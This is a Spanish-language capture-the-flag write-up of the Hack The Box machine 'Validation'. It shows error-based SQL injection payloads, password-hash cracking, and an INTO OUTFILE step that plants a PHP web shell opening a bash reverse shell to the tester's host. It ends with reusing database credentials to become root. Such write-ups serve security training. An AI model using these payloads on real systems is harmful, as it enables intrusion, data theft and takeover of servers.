---
layout: post
title: Validation
date: 2023-06-07
description:
img:
fig-caption:
tags: [eJPT]
---
___

<center><img src="/writeups/assets/img/Validation-htb/Validation.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Inyección SQL - Error Based

* Reutilización de Credenciales (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.116 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 09:45 GMT
Nmap scan report for 10.10.11.116
Host is up (0.063s latency).
Not shown: 65522 closed tcp ports (reset), 9 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4566/tcp open  kwtc
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 11.66 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,4566,8080 10.10.11.116 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 09:45 GMT
Nmap scan report for 10.10.11.116
Host is up (0.069s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8f5efd2d3f98dadc6cf24859426ef7a (RSA)
|   256 463d6bcba819eb6ad06886948673e172 (ECDSA)
|_  256 7032d7e377c14acf472adee5087af87a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.116
http://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
```

La página principal se ve así:

<img src="/writeups/assets/img/Validation-htb/1.png" alt="">

Introduzco texto en el campo. Es vulnerable a inyección HTML, por ejemplo, ```<h1>test</h1>``` y a inyecciones XSS con las etiquetas ```<script>```

<img src="/writeups/assets/img/Validation-htb/2.png" alt="">

Ahrora intecepto la petición con ```BurpSuite``` para ver como se tramita

```null
POST / HTTP/1.1
Host: 10.10.11.116
Content-Length: 28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.116
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.116/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=test&country=Brazil
```

Introduzco una comilla simple en el campo country y en la respuesta aparece un error

```null
</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
Stack trace:
#0 {main}
  thrown in <b>/var/www/html/account.php</b>
```

Es vulnerable a inyección SQL. Si introduzco ```test' union select database()```, en la respuesta me aparece la base de datos actualmente en uso

<img src="/writeups/assets/img/Validation-htb/3.png" alt="">

Listo todas las bases de datos

```null
Brazil' union select group_concat(schema_name) from information_schema.schemata-- -
```

<img src="/writeups/assets/img/Validation-htb/4.png" alt="">

Para ```registration``` las tablas

```null
Brazil' union select group_concat(table_name) from information_schema.tables where table_schema="registration"-- -
```

Vuelve a llamarse ```registration```

<img src="/writeups/assets/img/Validation-htb/3.png" alt="">

Listo las columnas

```null
Brazil' union select group_concat(column_name) from information_schema.columns where table_schema="registration" and table_name="registration"-- -
```

<img src="/writeups/assets/img/Validation-htb/5.png" alt="">

Me quedo con usuario y contraseña

```null
Brazil' union select group_concat(username,0x3a,userhash) from registration.registration-- -
```

<img src="/writeups/assets/img/Validation-htb/6.png" alt="">

Lo crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
test             (?)     
1g 0:00:00:00 DONE (2023-06-07 10:43) 100.0g/s 16627Kp/s 16627Kc/s 16627KC/s tyson22..taurus89
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Como tampoco puedo iniciar sesión en ningún sitio, no me sirve de nada. Pruebo a depositar contenido en un archivo

```null
Brazil' union select "Testing" into outfile "/var/www/html/rubbx.txt"-- -
```

Existe y puedo acceder a este

```null
curl -s -X GET http://10.10.11.116/rubbx.txt
Testing
```

Creo un archivo en PHP que se encargue de enviar una reverse shell

```null
Brazil' union select "<?php system(\"bash -c 'bash -i >%26 /dev/tcp/10.10.16.9/443 0>%261'\");" into outfile "/var/www/html/pwned.php"-- -
```

Tramito una petición por GET

```null
curl -s -X GET http://10.10.11.116/pwned.php
```

Gano acceso al sistema en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.116] 59752
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ script /dev/null -c -bash
script /dev/null -c -bash
Script started, output log file is '/dev/null'.
sh: 0: Illegal option -h
Script done.
www-data@validation:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@validation:/var/www/html$ export TERM=xterm
www-data@validation:/var/www/html$ export SHELL=bash
www-data@validation:/var/www/html$ stty rows 55 columns 209
```

Puedo ver la primera flag

```null
www-data@validation:/home/htb$ cat user.txt 
80731d0aa4d8d4c4a4fd5a61c8daa860
```

# Escalada

En ```config.php``` se exponen credenciales en texto claro

```null
www-data@validation:/var/www/html$ cat config.php 
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

La constraseña se reutiliza para ```root```. Puedo ver la segunda flag

```null
www-data@validation:/var/www/html$ su root
Password: 
root@validation:/var/www/html# cat /root/root.txt 
9d597668993420c8c30551bebde12b01
```